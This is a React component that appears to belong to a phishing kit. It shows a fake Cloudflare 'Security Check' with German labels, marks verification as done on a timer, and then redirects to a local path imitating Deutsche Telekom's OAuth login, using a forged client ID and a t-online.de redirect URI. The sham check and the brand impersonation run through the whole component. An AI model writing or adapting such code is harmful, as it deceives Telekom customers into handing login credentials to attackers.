import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

const SecurityCheck = () => {
  const navigate = useNavigate();
  const [isVerifying, setIsVerifying] = useState(false);
  const [isComplete, setIsComplete] = useState(false);

  // Generate random OAuth2 parameters
  const generateRandomString = (length: number) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateClientId = () => {
    const prefix = '10LIVESAM';
    const suffix = 'PORTALE';
    const middle = Math.random().toString().slice(2, 15);
    const end = '0'.repeat(15);
    return `${prefix}${middle}${suffix}${end}`;
  };

  useEffect(() => {
    // Auto-start verification after component mounts
    const timer = setTimeout(() => {
      setIsVerifying(true);
      
      // Complete verification after 3 seconds
      const completeTimer = setTimeout(() => {
        setIsComplete(true);
        
        // Navigate to login after showing success
        const navigateTimer = setTimeout(() => {
          const clientId = generateClientId();
          const state = generateRandomString(43);
          const nonce = generateRandomString(43);
          const claims = encodeURIComponent('{"id_token":{"urn:telekom.com:all":null}}');
          const redirectUri = encodeURIComponent('https://www.t-online.de/auth/login/oauth2/code/telekom');
          
          const oauthUrl = `/oauth2/auth/io?response_type=code&client_id=${clientId}&scope=openid&claims=${claims}&state=${state}&redirect_uri=${redirectUri}&nonce=${nonce}`;
          navigate(oauthUrl);
        }, 1500);
        
        return () => clearTimeout(navigateTimer);
      }, 3000);
      
      return () => clearTimeout(completeTimer);
    }, 1000);
    
    return () => clearTimeout(timer);
  }, [navigate]);

  return (
    <div className="min-h-screen flex items-center justify-center" 
         style={{ background: 'var(--gradient-bg)' }}>
      <div className="w-full max-w-md px-4">
        <Card className="p-8 text-center border-0" 
              style={{ 
                background: 'var(--gradient-card)',
                boxShadow: 'var(--shadow-card)',
                backdropFilter: 'blur(10px)'
              }}>
          <h1 className="text-2xl font-semibold mb-4 text-gray-800">
            Security Check
          </h1>
          <p className="text-gray-600 mb-8">
            Please complete the security verification to continue
          </p>
          
          <div className="bg-gray-800 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                {isComplete ? (
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                    <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                ) : (
                  <div className={`w-6 h-6 border-2 border-green-500 rounded-full ${isVerifying ? 'animate-spin border-t-transparent' : ''}`} />
                )}
                <span className="text-white text-sm font-medium">
                  {isComplete ? 'Erfolg!' : isVerifying ? 'Verifying...' : 'Checking...'}
                </span>
              </div>
              <div className="text-right">
                <div className="text-xs text-gray-400 uppercase tracking-wider">Cloudflare</div>
                <div className="text-xs text-gray-400">Privatsphäre</div>
                <div className="text-xs text-gray-400">Nutzungsbedingungen</div>
              </div>
            </div>
          </div>
          
          {isComplete && (
            <div className="text-green-600 text-sm">
              Verification complete! Redirecting...
            </div>
          )}
        </Card>
      </div>
    </div>
  );
};

export default SecurityCheck;